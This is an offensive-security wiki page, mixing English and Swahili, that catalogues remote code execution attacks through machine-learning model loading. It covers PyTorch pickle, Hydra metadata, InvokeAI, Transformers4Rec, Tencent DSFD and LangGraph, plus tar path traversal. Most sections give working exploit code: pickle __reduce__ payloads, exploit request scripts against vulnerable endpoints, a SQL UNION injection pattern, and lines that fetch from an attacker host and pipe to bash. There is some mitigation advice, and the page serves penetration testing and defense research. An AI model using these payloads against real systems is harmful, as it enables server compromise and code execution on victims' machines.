# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

Wakati wa uandishi, hizi ni baadhi ya mifano ya aina hii ya vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Zaidi ya hayo, kuna baadhi ya modeli za python pickle based kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security) ambazo zinaweza kutumika kutekeleza arbitrary code kwenye mfumo ikiwa hazijapakiwa na `weights_only=True`. Kwa hivyo, model yoyote ya pickle based inaweza kuwa hasa rahisi kushambuliwa na aina hii ya attacks, hata kama haijatajwa kwenye jedwali hapo juu.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Mambo muhimu:
- Huanzishwa kabla ya model initialization katika NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, na FlexTok loaders.
- Hydra’s string block-list inaweza kupitishwa kupitia alternative import paths (kwa mfano, `enum.bltns.eval`) au application-resolved names (kwa mfano, `nemo.core.classes.common.os.system` → `posix`).
- FlexTok pia huchambua stringified metadata kwa `ast.literal_eval`, ikiruhusu DoS (CPU/memory blowup) kabla ya Hydra call.

### 🆕  InvokeAI RCE kupitia `torch.load` (CVE-2024-12029)

`InvokeAI` ni open-source web interface maarufu kwa Stable-Diffusion. Versions **5.3.1 – 5.4.2** hufichua REST endpoint `/api/v2/models/install` inayoruhusu users kupakua na kupakia models kutoka arbitrary URLs.

Kwa ndani endpoint hatimaye huita:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wakati faili iliyotolewa ni **PyTorch checkpoint (`*.ckpt`)**, `torch.load` hufanya **pickle deserialization**. Kwa kuwa maudhui yanatoka moja kwa moja kwenye URL inayodhibitiwa na mtumiaji, mshambuliaji anaweza kupachika object hasidi yenye method maalum ya `__reduce__` ndani ya checkpoint; method hiyo hutekelezwa **wakati wa deserialization**, na kusababisha **remote code execution (RCE)** kwenye server ya InvokeAI.

Udhaifu huu ulipewa **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Tengeneza malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Pangisha `payload.ckpt` kwenye HTTP server unayodhibiti (mfano `http://ATTACKER/payload.ckpt`).
3. Anzisha endpoint iliyoathirika (hakuna uthibitishaji unaohitajika):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wakati InvokeAI inapopakua faili, inaita `torch.load()` → gadget ya `os.system` inaendeshwa na mshambulizi anapata code execution katika context ya mchakato wa InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` inaotomatiki mchakato mzima.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  `/api/v2/models/install` reachable by the attacker
•  Process ina permissions za execute shell commands

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – the patch sets `scan=True` by default and performs malware scanning before deserialization.
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Enforce allow-lists / signatures for model sources and run the service with least-privilege.

> ⚠️ Remember that **any** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) is inherently unsafe to deserialize from untrusted sources.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE kupitia unsafe `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (sehemu ya Merlin) ilifichua unsafe checkpoint loader iliyokuwa ikipiga simu moja kwa moja `torch.load()` kwenye paths zilizotolewa na mtumiaji. Kwa kuwa `torch.load` inategemea Python `pickle`, checkpoint inayodhibitiwa na mshambuliaji inaweza kutekeleza arbitrary code kupitia reducer wakati wa deserialization.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Kwa nini hii inaongoza kwa RCE: Katika Python pickle, object inaweza kufafanua reducer (`__reduce__`/`__setstate__`) ambayo inarudisha callable na arguments. Callable hiyo inatekelezwa wakati wa unpickling. Ikiwa object kama hiyo ipo kwenye checkpoint, inaendeshwa kabla weights zozote hazijatumika.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Pakia modeli:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD inaweka wazi endpoint ya `resnet` ambayo inafanya deserialization ya data inayodhibitiwa na mtumiaji. ZDI ilithibitisha kwamba mshambuliaji wa mbali anaweza kumlazimisha mwathiriwa kupakia ukurasa/faili hasidi, apeleke blob iliyoserializwa iliyoundwa mahsusi kwenye endpoint hiyo, na kusababisha deserialization kama `root`, na hivyo kupelekea compromise kamili.

Mtiririko wa exploit unafanana na matumizi ya kawaida ya pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Gadget yoyote inayoweza kufikiwa wakati wa deserialization (constructors, `__setstate__`, framework callbacks, n.k.) inaweza kutumiwa kwa njia ileile, bila kujali kama transport ilikuwa HTTP, WebSocket, au file iliyodondoshwa kwenye watched directory.



### LangGraph checkpointer SQLi → MessagePack RCE

Mnyororo huu wa attack unavutia kwa sababu attacker **hahitajiki kupakia malicious model file**. Badala yake, application inafichua **AI-agent persistence API** (`get_state_history(..., filter=...)`) na user input hufikia checkpointer query builder.

#### 1. Structural SQLi katika metadata filters

Pattern ya SQLite yenye udhaifu ilionekana kama:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Thamani huwekwa baadaye, lakini `query_key` huunganishwa kwenye **string ya JSON path**, kwa hiyo `'` ndani ya key ya dictionary hutoka kwenye `'$.{query_key}'` na kuingiza SQL. Funzo hilo hilo linatumika kwa **JSON paths, identifiers, operators, `LIMIT`, na TTL fields**: placeholders hulinda values pekee, si structural query syntax.

#### 2. `UNION SELECT` inaweza kulenga downstream sinks, si tu wizi wa data

Query hurejesha `type` na serialized `checkpoint` bytes, ambazo baadaye hutumiwa kama:
```python
self.serde.loads_typed((type, checkpoint))
```
Hiyo inamaanisha kwamba SQLi katika kifungu cha `WHERE` inaweza kuingiza **safu ya matokeo ya uongo**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Ikiwa baadaye code itaparse, itadeserialize, itaandika, au itatekeleza column yoyote iliyochaguliwa, weka hizo columns kulingana na sinks zao. Katika kesi hii row ya bandia hugeuza SQLi kuwa **attacker-controlled deserialization**.

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

Njia ya `msgpack` ya LangGraph ilitumia custom extension hook iliyopack nested tuple na ikatekeleza:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Kwa hivyo kitu cha MessagePack extension object kinachosimba kitu sawa na `("os", "system", "id > /tmp/pwned")` hu-import `os`, hu-resolve `system`, na huendesha command. Wakati wa kukagua AI frameworks, chunguza **custom MessagePack/JSON/pickle revivers** kwa dynamic imports, reflection, au arbitrary callable dispatch.

#### 4. Muundo wa vitendo wa ukaguzi kwa agent frameworks

Kagua input yoyote inayodhibitiwa na mtumiaji inayofika kwenye:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders zinazozalisha SQL au Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths zinazowaamini rows zilizorudishwa na persistence layer

Mlolongo huu mahususi uliathiri self-hosted LangGraph deployments zinazotumia **SQLite** au **Redis** checkpointers wakati watumiaji wasioaminika waliweza kudhibiti `filter`. Matoleo yaliyopatchiwa yaliyotajwa kwenye disclosure yalikuwa `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, na `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Kama ilivyosemwa kwenye [**blog post hii**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), miundo mingi ya models inayotumiwa na frameworks tofauti za AI inategemea archives, kwa kawaida `.zip`. Kwa hiyo, inawezekana kutumia vibaya formats hizi ili kufanya path traversal attacks, ikiruhusu kusoma files zozote kutoka kwenye system ambako model inapakiwa.

Kwa mfano, kwa code ifuatayo unaweza kuunda model ambayo itatengeneza file kwenye directory ya `/tmp` inapopakiwa:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Au, kwa kutumia code ifuatayo unaweza kuunda model ambayo itaunda symlink kwenda kwenye directory ya `/tmp` inapopakiwa:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras deserialization na gadget hunting

Kwa mwongozo maalum kuhusu ndani ya .keras, Lambda-layer RCE, tatizo la arbitrary import katika ≤ 3.8, na ugunduzi wa gadget baada ya fix ndani ya allowlist, angalia:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
